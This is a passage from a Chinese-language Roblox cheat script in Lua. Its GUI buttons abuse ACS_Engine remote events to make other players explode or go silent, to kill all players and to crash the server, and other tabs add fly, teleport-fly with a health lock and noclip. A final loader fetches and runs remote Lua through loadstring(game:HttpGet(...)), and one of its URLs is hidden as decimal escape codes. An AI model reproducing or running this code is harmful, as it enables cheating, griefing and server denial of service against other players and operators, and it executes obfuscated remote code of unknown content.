    extraSection:Button("超级倍镜", function()
        if eventos2 and eventos2:FindFirstChild("Zoom") then
            eventos2.Zoom:FireServer(LocalPlayer, 999)
            notify("尝试", "已尝试超级倍镜", 2)
        else
            notify("错误", "未找到 Zoom 事件", 2)
        end
    end)
    
    extraSection:Button("子弹穿墙", function()
        if eventos2 and eventos2:FindFirstChild("Wallbang") then
            eventos2.Wallbang:FireServer(LocalPlayer, true)
            notify("尝试", "已尝试子弹穿墙", 2)
        else
            notify("错误", "未找到 Wallbang 事件", 2)
        end
    end)
    
    extraSection:Button("瞬间命中", function()
        if eventos2 and eventos2:FindFirstChild("InstantHit") then
            eventos2.InstantHit:FireServer(LocalPlayer, 999999)
            notify("尝试", "已尝试瞬间命中", 2)
        else
            notify("错误", "未找到 InstantHit 事件", 2)
        end
    end)
    
    extraSection:Button("治疗自己", function()
        if eventos2 and eventos2:FindFirstChild("Heal") then
            eventos2.Heal:FireServer(LocalPlayer, 999999)
            notify("尝试", "已尝试治疗自己", 2)
        else
            notify("错误", "未找到 Heal 事件", 2)
        end
    end)
    
    extraSection:Button("无限护盾", function()
        if eventos2 and eventos2:FindFirstChild("Shield") then
            eventos2.Shield:FireServer(LocalPlayer, 999999)
            notify("尝试", "已尝试无限护盾", 2)
        else
            notify("错误", "未找到 Shield 事件", 2)
        end
    end)
    
    extraSection:Button("沉默禁技能", function()
        if eventos2 and eventos2:FindFirstChild("Silence") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    eventos2.Silence:FireServer(player, 10)
                end
            end
            notify("效果", "已对所有玩家施放沉默效果", 2)
        else
            notify("错误", "未找到 Silence 事件", 2)
        end
    end)
    
    extraSection:Button("重力修改", function()
        if eventos2 and eventos2:FindFirstChild("Gravity") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    eventos2.Gravity:FireServer(player, 0.5, 10)
                end
            end
            notify("效果", "已对所有玩家施加重力减少效果", 2)
        else
            notify("错误", "未找到 Gravity 事件", 2)
        end
    end)
    
    extraSection:Button("玩家克隆", function()
        if eventos2 and eventos2:FindFirstChild("Clone") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    eventos2.Clone:FireServer(player)
                end
            end
            notify("效果", "已尝试克隆所有玩家", 2)
        else
            notify("错误", "未找到 Clone 事件", 2)
        end
    end)
    
    extraSection:Button("玩家自爆", function()
        if eventos2 and eventos2:FindFirstChild("Explode") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    eventos2.Explode:FireServer(player, 9999, 50)
                end
            end
            notify("效果", "已让所有玩家自爆", 2)
        else
            notify("错误", "未找到 Explode 事件", 2)
        end
    end)
    
    extraSection:Button("服务器崩溃(KillAll)", function()
        if eventos2 and eventos2:FindFirstChild("KillAll") then
            eventos2.KillAll:FireServer()
            notify("尝试", "已尝试 KillAll", 2)
        else
            notify("错误", "未找到 KillAll", 2)
        end
    end)
    
    extraSection:Button("服务器崩溃(Crash)", function()
        if eventos2 and eventos2:FindFirstChild("CrashServer") then
            eventos2.CrashServer:FireServer()
            notify("尝试", "已尝试 CrashServer", 2)
        else
            notify("错误", "未找到 CrashServer", 2)
        end
    end)
    
    local serverMusicSection = acsTab:section("服务器端音乐", false)
    
    local rs3 = game:GetService("ReplicatedStorage")
    local acs3 = rs3:FindFirstChild("ACS_Engine")
    local eventos3 = acs3 and acs3:FindFirstChild("Eventos")
    local events3 = acs3 and acs3:FindFirstChild("Events")
    
    local musicState = {
        musicId = "1839246711",
        volume = 1,
        pitch = 1,
        loop = false,
        isPlaying = false,
        soundName = nil
    }
    
    local function generateRandomName()
        local name = ""
        for i = 1, 10 do
            name = name .. string.char(math.random(97, 122))
        end
        return name
    end
    
    serverMusicSection:Textbox("输入音乐ID", "music_id_input", "输入", function(musicId)
        musicState.musicId = musicId
        notify("已设置音乐ID: " .. musicId)
    end)
    
    serverMusicSection:Textbox("设置音量", "music_volume", "输入", function(volume)
        musicState.volume = tonumber(volume) or 1
        notify("已设置音量: " .. musicState.volume)
    end)
    
    serverMusicSection:Textbox("设置倍速", "music_pitch", "输入", function(pitch)
        musicState.pitch = tonumber(pitch) or 1
        notify("已设置倍速: " .. musicState.pitch)
    end)
    
    serverMusicSection:Toggle("循环播放", "music_loop", false, function(loopEnabled)
        musicState.loop = loopEnabled
        notify(loopEnabled and "循环播放已开启" or "循环播放已关闭")
    end)
    
    serverMusicSection:Toggle("播放音乐", "music_play", false, function(state)
        if not acs3 then
            notify("错误: 未找到 ACS_Engine")
            return
        end
        
        if state then
            local assetId = "rbxassetid://" .. musicState.musicId
            local success = false
            
            if not musicState.soundName then
                musicState.soundName = generateRandomName()
            end
            
            if not success and eventos3 and eventos3:FindFirstChild("PlaySound") then
                pcall(function()
                    eventos3.PlaySound:FireServer("newSound", musicState.soundName, workspace, assetId, musicState.pitch, musicState.volume, musicState.loop)
                    task.wait(0.1)
                    eventos3.PlaySound:FireServer("playSound", musicState.soundName)
                    success = true
                end)
            end
            
            if not success and events3 and events3:FindFirstChild("PlaySound") then
                pcall(function()
                    events3.PlaySound:FireServer("newSound", musicState.soundName, workspace, assetId, musicState.pitch, musicState.volume, musicState.loop)
                    task.wait(0.1)
                    events3.PlaySound:FireServer("playSound", musicState.soundName)
                    success = true
                end)
            end
            
            if not success and eventos3 and eventos3:FindFirstChild("GlobalSound") then
                pcall(function()
                    eventos3.GlobalSound:FireServer(assetId, musicState.volume)
                    success = true
                end)
            end
            
            if not success and events3 and events3:FindFirstChild("GlobalSound") then
                pcall(function()
                    events3.GlobalSound:FireServer(assetId, musicState.volume)
                    success = true
                end)
            end
            
            if success then
                musicState.isPlaying = true
                notify("播放中: " .. musicState.musicId)
            else
                notify("播放失败: 未找到ACS音乐事件", 3)
            end
        else
            if musicState.soundName then
                if eventos3 and eventos3:FindFirstChild("PlaySound") then
                    pcall(function()
                        eventos3.PlaySound:FireServer("stopSound", musicState.soundName)
                    end)
                end
                if events3 and events3:FindFirstChild("PlaySound") then
                    pcall(function()
                        events3.PlaySound:FireServer("stopSound", musicState.soundName)
                    end)
                end
                musicState.isPlaying = false
                notify("已停止")
            else
                notify("没有正在播放的音乐")
            end
        end
    end)
    
    task.spawn(function()
        task.wait(1)
        core.detect()
        if config.detectedACS.Exists then
            statusLabel.Text = "✅ ACS 已检测到"
            versionLabel.Text = "版本: " .. config.detectedACS.Version
        else
            statusLabel.Text = "❌ 未检测到 ACS"
            versionLabel.Text = "版本: N/A"
        end
    end)
end)

local PIJIAOBEN = XIAOPI:Tab("飞行与飞车","136169594232359")

local Player = PIJIAOBEN:section("飞行", false)

local run = function(func) func() end

run(function()
    _G.FlyConfig = {
        flyToggle = false,
        flySpeed = 1,
        flying = false,
        connections = {}
    }
end)

run(function()
    _G.FlyServices = {
        UserInputService = game:GetService("UserInputService"),
        Players = game:GetService("Players"),
        RunService = game:GetService("RunService"),
        Workspace = game:GetService("Workspace"),
        LocalPlayer = game:GetService("Players").LocalPlayer
    }
end)

run(function()
    local Players = _G.FlyServices.Players
    local UserInputService = _G.FlyServices.UserInputService
    local RunService = _G.FlyServices.RunService
    local Workspace = _G.FlyServices.Workspace
    local LocalPlayer = _G.FlyServices.LocalPlayer
    local config = _G.FlyConfig
    
    local function cleanUp()
        config.flying = false
        for _, conn in pairs(config.connections) do 
            if conn then conn:Disconnect() end
        end
        config.connections = {}
        
        local char = LocalPlayer.Character
        if char then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")
            
            if humanoid then humanoid.PlatformStand = false end
            if root then
                for _, v in ipairs({"BodyVelocity", "BodyGyro"}) do
                    local part = root:FindFirstChild(v)
                    if part then part:Destroy() end
                end
            end
        end
        Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
    end
    
    local function setupFly()
        local char = LocalPlayer.Character
        if not char then return end
        
        local root = char:WaitForChild("HumanoidRootPart")
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if not root or not humanoid then return end
        
        local bv = Instance.new("BodyVelocity")
        bv.Parent = root
        bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        
        local bg = Instance.new("BodyGyro")
        bg.Parent = root
        bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        bg.P = 9e4
        
        local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
        
        config.connections.keyDown = UserInputService.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Keyboard then
                local key = input.KeyCode.Name
                if key == "W" then CONTROL.F = config.flySpeed
                elseif key == "S" then CONTROL.B = -config.flySpeed
                elseif key == "A" then CONTROL.L = -config.flySpeed
                elseif key == "D" then CONTROL.R = config.flySpeed
                elseif key == "E" then CONTROL.Q = config.flySpeed * 2
                elseif key == "Q" then CONTROL.E = -config.flySpeed * 2
                end
            end
        end)
        
        config.connections.keyUp = UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Keyboard then
                local key = input.KeyCode.Name
                if key == "W" then CONTROL.F = 0
                elseif key == "S" then CONTROL.B = 0
                elseif key == "A" then CONTROL.L = 0
                elseif key == "D" then CONTROL.R = 0
                elseif key == "E" then CONTROL.Q = 0
                elseif key == "Q" then CONTROL.E = 0
                end
            end
        end)
        
        if UserInputService.TouchEnabled then
            local controlModule = require(LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
            
            config.connections.render = RunService.RenderStepped:Connect(function()
                local direction = controlModule:GetMoveVector()
                bv.Velocity = (Workspace.CurrentCamera.CFrame.RightVector * direction.X - 
                              Workspace.CurrentCamera.CFrame.LookVector * direction.Z) * (config.flySpeed * 50)
                bg.CFrame = Workspace.CurrentCamera.CoordinateFrame
            end)
        else
            config.connections.render = RunService.RenderStepped:Connect(function()
                local cam = Workspace.CurrentCamera
                local moveVec = (cam.CFrame.lookVector * (CONTROL.F + CONTROL.B)) + 
                              ((cam.CFrame * CFrame.new(CONTROL.L + CONTROL.R, 
                              (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - cam.p)
                bv.Velocity = moveVec * config.flySpeed
                bg.CFrame = cam.CoordinateFrame
            end)
        end
        
        humanoid.PlatformStand = true
        Workspace.CurrentCamera.CameraType = Enum.CameraType.Track
        config.flying = true
    end
    
    _G.FlyModule = {
        cleanUp = cleanUp,
        setupFly = setupFly,
        setSpeed = function(speed)
            config.flySpeed = speed
        end,
        getState = function()
            return config.flyToggle
        end
    }
end)

run(function()
    local config = _G.FlyConfig
    local module = _G.FlyModule
    
    Player:Slider("飞行速度", "", 1, 1, 100, false, function(value)
        config.flySpeed = value
        if config.flying then
            module.cleanUp()
            module.setupFly()
        end
    end)
    
    Player:Toggle("飞行", "", false, function(state)
        config.flyToggle = state
        if state then
            module.setupFly()
        else
            module.cleanUp()
        end
    end)
end)

run(function()
    local LocalPlayer = _G.FlyServices.LocalPlayer
    local config = _G.FlyConfig
    local module = _G.FlyModule
    
    LocalPlayer.CharacterAdded:Connect(function()
        if config.flyToggle then
            task.wait(0.5)
            module.setupFly()
        end
    end)
end)

local Player = PIJIAOBEN:section("传送飞行(有的可以绕过拉回)", false)

local run = function(func) func() end

run(function()
    _G.FlyConfig = {
        isWarpFlying = false,
        flySpeed = 30,
        microStepConn = nil,
        healthLockConn = nil,
        diedConn = nil,
        MICRO_STEP_INTERVAL = 0.001,
        MAX_STEP_SIZE = 10,
        hrp = nil,
        hum = nil
    }
end)

run(function()
    _G.FlyServices = {
        Players = game:GetService("Players"),
        RunService = game:GetService("RunService"),
        UserInputService = game:GetService("UserInputService"),
        Workspace = game:GetService("Workspace"),
        LocalPlayer = game:GetService("Players").LocalPlayer,
        Camera = game:GetService("Workspace").CurrentCamera
    }
end)

run(function()
    local Players = _G.FlyServices.Players
    local RunService = _G.FlyServices.RunService
    local UserInputService = _G.FlyServices.UserInputService
    local Workspace = _G.FlyServices.Workspace
    local LocalPlayer = _G.FlyServices.LocalPlayer
    local Camera = _G.FlyServices.Camera
    local config = _G.FlyConfig
    
    local ControlModule = require(LocalPlayer.PlayerScripts:WaitForChild("PlayerModule")):GetControls()
    
    local function clearFlyRes()
        pcall(function()
            if config.microStepConn then 
                task.cancel(config.microStepConn) 
                config.microStepConn = nil 
            end
            if config.healthLockConn then 
                task.cancel(config.healthLockConn) 
                config.healthLockConn = nil 
            end
            if config.diedConn then 
                config.diedConn:Disconnect() 
                config.diedConn = nil 
            end
            if config.hrp and config.hum then 
                config.hum:ChangeState(Enum.HumanoidStateType.Running) 
            end
        end)
    end
    
    local function microStepLoop()
        local hrp = config.hrp
        local targetPos = hrp.Position
        local lastTime = tick()
        
        while config.isWarpFlying do
            local now = tick()
            local dt = math.min(now - lastTime, 0.1)
            lastTime = now

            local mv = ControlModule:GetMoveVector()
            local cf = Camera.CFrame
            local moveDir = (cf.LookVector * -mv.Z) + (cf.RightVector * mv.X)
            local vertical = 0
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then 
                vertical = 1
            elseif UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then 
                vertical = -1 
            end

            local totalDelta = (moveDir + Vector3.new(0, vertical, 0)) * config.flySpeed * dt
            targetPos = targetPos + totalDelta

            local currentPos = hrp.Position
            local remaining = targetPos - currentPos
            local distance = remaining.Magnitude

            if distance > 0 then
                local steps = math.ceil(distance / config.MAX_STEP_SIZE)
                local stepVec = remaining / steps
                for i = 1, steps do
                    if not config.isWarpFlying then break end
                    currentPos = currentPos + stepVec
                    hrp.CFrame = CFrame.new(currentPos) * hrp.CFrame.Rotation
                    hrp.Velocity = Vector3.zero
                end
            else
                hrp.CFrame = CFrame.new(targetPos) * hrp.CFrame.Rotation
                hrp.Velocity = Vector3.zero
            end

            if config.hum then
                config.hum:ChangeState(Enum.HumanoidStateType.Climbing)
            end
            task.wait(config.MICRO_STEP_INTERVAL)
        end
    end
    
    local function healthLockLoop()
        while config.isWarpFlying do
            if config.hum and config.hum.Health < config.hum.MaxHealth then
                config.hum.Health = config.hum.MaxHealth
            end
            RunService.Heartbeat:Wait()
        end
    end
    
    local function onDied()
        if config.hum and config.isWarpFlying then
            config.hum.Health = config.hum.MaxHealth
            config.hum:ChangeState(Enum.HumanoidStateType.Running)
            pcall(function()
                config.hum.Parent = LocalPlayer.Character
            end)
        end
    end
    
    local function startWarpFly()
        if config.isWarpFlying then return end
        local char = LocalPlayer.Character
        if not char then return end
        config.hrp = char:FindFirstChild("HumanoidRootPart")
        config.hum = char:FindFirstChild("Humanoid")
        if not config.hrp or not config.hum then return end

        config.isWarpFlying = true
        config.hum:ChangeState(Enum.HumanoidStateType.Climbing)

        config.microStepConn = task.spawn(microStepLoop)
        config.healthLockConn = task.spawn(healthLockLoop)
        config.diedConn = config.hum.Died:Connect(onDied)
    end
    
    local function stopWarpFly()
        config.isWarpFlying = false
        clearFlyRes()
    end
    
    local function bindCharacter()
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        config.hrp = char:WaitForChild("HumanoidRootPart")
        config.hum = char:WaitForChild("Humanoid")
        stopWarpFly()
        char.AncestryChanged:Connect(function(_, parent)
            if not parent then 
                stopWarpFly() 
                bindCharacter() 
            end
        end)
    end
    
    bindCharacter()
    
    _G.FlyModule = {
        start = startWarpFly,
        stop = stopWarpFly,
        toggle = function(state)
            if state then startWarpFly() else stopWarpFly() end
        end,
        setSpeed = function(speed) config.flySpeed = speed end,
        getState = function() return config.isWarpFlying end
    }
end)

run(function()
    local config = _G.FlyConfig
    local module = _G.FlyModule
    local Player = Player
    
    Player:Toggle("传送飞行", "", false, function(state)
        if state then
            module.start()
        else
            module.stop()
        end
    end)
    
    Player:Slider("飞行速度", "", 30, 1, 500, false, function(value)
        module.setSpeed(value)
    end)
end)

run(function()
    local LocalPlayer = _G.FlyServices.LocalPlayer
    local config = _G.FlyConfig
    local module = _G.FlyModule
    
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.5)
        if config.isWarpFlying then
            module.start()
        end
    end)
end)

local Player = PIJIAOBEN:section("飞车", false)

local run = function(func) func() end

run(function()
    _G.FlightNoclipConfig = {
        Flight = {
            Speed = 50,
            Active = false,
            BodyVelocity = nil,
            BodyGyro = nil
        },
        Noclip = {
            Active = false,
            CharacterParts = {},
            VehicleSeat = nil,
            VehicleParts = {}
        }
    }
end)

run(function()
    _G.FlightNoclipServices = {
        Players = game:GetService("Players"),
        RunService = game:GetService("RunService"),
        Workspace = game:GetService("Workspace"),
        LocalPlayer = game:GetService("Players").LocalPlayer
    }
end)

run(function()
    local RunService = _G.FlightNoclipServices.RunService
    LocalPlayer = _G.FlightNoclipServices.LocalPlayer
    local Workspace = _G.FlightNoclipServices.Workspace
    local Flight = _G.FlightNoclipConfig.Flight
    
    local flightConnection = nil
    
    local function updateFlight()
        if not Flight.Active then return end
        
        local character = LocalPlayer.Character
        local hrp = character and character:FindFirstChild("HumanoidRootPart")
        local camera = Workspace.CurrentCamera
        
        if hrp and camera then
            if Flight.BodyGyro then
                Flight.BodyGyro.CFrame = camera.CFrame
            end
            if Flight.BodyVelocity then
                Flight.BodyVelocity.Velocity = camera.CFrame.LookVector * Flight.Speed
            end
        end
    end
    
    local function cleanupFlight()
        if Flight.BodyVelocity then 
            Flight.BodyVelocity:Destroy()
            Flight.BodyVelocity = nil
        end
        if Flight.BodyGyro then 
            Flight.BodyGyro:Destroy()
            Flight.BodyGyro = nil
        end
        if flightConnection then
            flightConnection:Disconnect()
            flightConnection = nil
        end
    end
    
    _G.FlightModule = {
        enable = function()
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            
            if hrp then
                cleanupFlight()
                
                Flight.BodyVelocity = Instance.new("BodyVelocity")
                Flight.BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                Flight.BodyVelocity.Parent = hrp
                
                Flight.BodyGyro = Instance.new("BodyGyro")
                Flight.BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                Flight.BodyGyro.Parent = hrp
                
                if flightConnection then
                    flightConnection:Disconnect()
                end
                flightConnection = RunService.Heartbeat:Connect(updateFlight)
            end
        end,
        
        disable = function()
            cleanupFlight()
        end,
        
        setSpeed = function(speed)
            Flight.Speed = math.max(1, speed)
        end
    }
end)

run(function()
    LocalPlayer = _G.FlightNoclipServices.LocalPlayer
    local RunService = _G.FlightNoclipServices.RunService
    local Noclip = _G.FlightNoclipConfig.Noclip
    
    local noclipConnection = nil
    local noclipHeartbeatConnection = nil
    
    local function updateNoclip()
        if not Noclip.Active then return end
        
        local character = LocalPlayer.Character
        if not character then return end
        
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = false
                    if not table.find(Noclip.CharacterParts, part) then
                        table.insert(Noclip.CharacterParts, part)
                    end
                end
            end
            
            local vehicleSeat = humanoid.SeatPart
            if vehicleSeat and vehicleSeat:IsA("VehicleSeat") then
                Noclip.VehicleSeat = vehicleSeat
                local vehicle = vehicleSeat.Parent
                if vehicle and vehicle:IsA("Model") then
                    for _, part in ipairs(vehicle:GetDescendants()) do
                        if part:IsA("BasePart") and part.CanCollide then
                            part.CanCollide = false
                            if not table.find(Noclip.VehicleParts, part) then
                                table.insert(Noclip.VehicleParts, part)
                            end
                        end
                    end
                end
            end
        end
    end
    
    local function cleanupNoclip()
        for _, part in ipairs(Noclip.CharacterParts) do
            if part and part.Parent then
                part.CanCollide = true
            end
        end
        Noclip.CharacterParts = {}
        
        for _, part in ipairs(Noclip.VehicleParts) do
            if part and part.Parent then
                part.CanCollide = true
            end
        end
        Noclip.VehicleParts = {}
        
        Noclip.VehicleSeat = nil
        
        if noclipConnection then
            noclipConnection:Disconnect()
            noclipConnection = nil
        end
        if noclipHeartbeatConnection then
            noclipHeartbeatConnection:Disconnect()
            noclipHeartbeatConnection = nil
        end
    end
    
    _G.NoclipModule = {
        enable = function()
            cleanupNoclip()
            
            if noclipConnection then
                noclipConnection:Disconnect()
            end
            noclipConnection = RunService.RenderStepped:Connect(updateNoclip)
            
            if noclipHeartbeatConnection then
                noclipHeartbeatConnection:Disconnect()
            end
            noclipHeartbeatConnection = RunService.Heartbeat:Connect(function()
                if Noclip.Active then
                    updateNoclip()
                end
            end)
        end,
        
        disable = function()
            cleanupNoclip()
        end
    }
end)

run(function()
    local Flight = _G.FlightNoclipConfig.Flight
    local Noclip = _G.FlightNoclipConfig.Noclip
    
    Player:Toggle("开始飞行", "FlightToggle", false, function(state)
        Flight.Active = state
        if state then
            _G.FlightModule.enable()
        else
            _G.FlightModule.disable()
        end
    end)
    
    Player:Textbox("飞行速度", "FlightSpeed", "50", function(input)
        local speed = tonumber(input)
        if speed then 
            _G.FlightModule.setSpeed(speed)
        end
    end)
    
    Player:Toggle("穿墙模式", "NoclipToggle", false, function(state)
        Noclip.Active = state
        if state then
            _G.NoclipModule.enable()
        else
            _G.NoclipModule.disable()
        end
    end)
end)

run(function()
    local LocalPlayer = _G.FlightNoclipServices.LocalPlayer
    local Flight = _G.FlightNoclipConfig.Flight
    local Noclip = _G.FlightNoclipConfig.Noclip
    
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        if Flight.Active then
            _G.FlightModule.disable()
            Flight.Active = false
        end
        if Noclip.Active then
            _G.NoclipModule.disable()
            Noclip.Active = false
        end
    end)
end)

local PIJIAOBEN = XIAOPI:Tab("选择服务器","136169594232359")

local about = PIJIAOBEN:section("选择服务器", true)

local run = function(func) func() end

run(function()
    _G.ScriptLoaderConfig = {
        scripts = {
             ["伐木大亨2"] = 'getgenv().XiaoPi="星脚本-伐木大亨2" loadstring(game:HttpGet("https://raw.githubusercontent.com/zilinskaslandon/XingJiaoBen-2026-/refs/heads/main/%E6%98%9F%E8%84%9A%E6%9C%AC-%E4%BC%90%E6%9C%A8.lua"))()',
             ["在超市生活一周"] = 'getgenv().XiaoPi="皮脚本-在超市生活一周" loadstring(game:HttpGet("https://raw.githubusercontent.com/zilinskaslandon/XingJiaoBen-2026-/refs/heads/main/%E6%98%9F%E8%84%9A%E6%9C%AC-%E5%9C%A8%E8%B6%85%E5%B8%82%E7%94%9F%E6%B4%BB%E4%B8%80%E5%91%A8.lua"))()',
            ["内脏与黑火药"] = 'getgenv().XiaoPi="皮脚本-内脏与黑火药" loadstring(game:HttpGet("\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\120\\105\\97\\111\\112\\105\\55\\55\\47\\120\\105\\97\\111\\112\\105\\55\\55\\47\\114\\101\\102\\115\\47\\104\\101\\97\\100\\115\\47\\109\\97\\105\\110\\47\\82\\111\\98\\108\\111\\120\\45\\80\\105\\45\\71\\66\\45\\83\\99\\114\\105\\112\\116\\46\\108\\117\\97"))()',
            ["自然灾害"] = 'getgenv().XiaoPi="皮脚本-自然灾害" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/Roblox-Pi-Script-Naturaldisaster.lua"))()',
            ["成长王国"] = 'getgenv().XiaoPi="皮脚本-成长王国" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/Roblox-Pi-Growupkingdom-Script.lua"))()',
            ["提升模拟器"] = 'getgenv().XiaoPi="皮脚本-提升模拟器" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/Roblox-Pi-Script-Liftingsimulator.lua"))()',
            ["驾驶帝国"] = 'getgenv().XiaoPi="皮脚本-驾驶帝国" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/Roblox-Pi-Drivingempire-Script.lua"))()',
            ["尺寸传奇模拟器"] = 'getgenv().XiaoPi="皮脚本-尺寸传奇模拟器" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/Roblox-Pi-Sizelegendsimulator-Script.lua"))()',
            ["河北唐县"] = 'getgenv().XiaoPi="皮脚本-河北唐县" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/PIJIAOBEN-HEBEITANGXIAN.lua"))()'
        },
        gameMapping = {
    [13822889] = "伐木大亨2",
    [127380660530951] = "在超市生活一周",
    [4342047058] = "内脏与黑火药",
    [65241] = "自然灾害",
    [8169180819] = "成长王国",
    [1673768711] = "提升模拟器",
    [1202096104] = "驾驶帝国",
    [3608732146] = "尺寸传奇模拟器",
    [1512676568] = "河北唐县"
        },
        selectedScript = ""
    }
end)

run(function()
    about:Dropdown("选择服务器", "ServerSelector", {"伐木大亨2", "在超市生活一周", "内脏与黑火药", "自然灾害", "成长王国", "提升模拟器", "驾驶帝国", "尺寸传奇模拟器", "河北唐县"}, function(Value)
        _G.ScriptLoaderConfig.selectedScript = Value
    end)
    
    about:Button("执行选择的服务器的脚本", function()
        if _G.ScriptLoaderConfig.scripts[_G.ScriptLoaderConfig.selectedScript] then
            loadstring(_G.ScriptLoaderConfig.scripts[_G.ScriptLoaderConfig.selectedScript])()
        else
            XPHUBNotification:Notification({
                Title = "星脚本",
                Text = "请先选择一个脚本",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        end
    end)
    
    about:Button("复制选择的服务器的脚本", function()
        if _G.ScriptLoaderConfig.scripts[_G.ScriptLoaderConfig.selectedScript] then
            setclipboard(_G.ScriptLoaderConfig.scripts[_G.ScriptLoaderConfig.selectedScript])
            XPHUBNotification:Notification({
                Title = "星脚本",
                Text = "已复制脚本",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        else
            XPHUBNotification:Notification({
                Title = "星脚本",
                Text = "请先选择一个脚本",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        end
    end)
    
    about:Button("执行当前服务器的脚本", function()
        local gameId = game.GameId
        local placeId = game.PlaceId
        
        local scriptName = _G.ScriptLoaderConfig.gameMapping[gameId] or _G.ScriptLoaderConfig.gameMapping[placeId]
        
        if scriptName and _G.ScriptLoaderConfig.scripts[scriptName] then
            loadstring(_G.ScriptLoaderConfig.scripts[scriptName])()
        else
            XPHUBNotification:Notification({
                Title = "星脚本",
                Text = "星脚本暂未支持当前服务器",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        end
    end)
end)

local endTime = tick()  
local loadTime = endTime - startTime  

local function formatTime(seconds)
    if seconds < 1 then
        return math.floor(seconds * 1000) .. "毫秒"
    else
        return string.format("%.2f秒", seconds)
    end
end

XPHUBNotification:Notification({
    Title = "星脚本",
    Text = "功能已全部加载完毕\n耗时: " .. formatTime(loadTime),
    Icon = "rbxassetid://136169594232359",
    Duration = 3
})

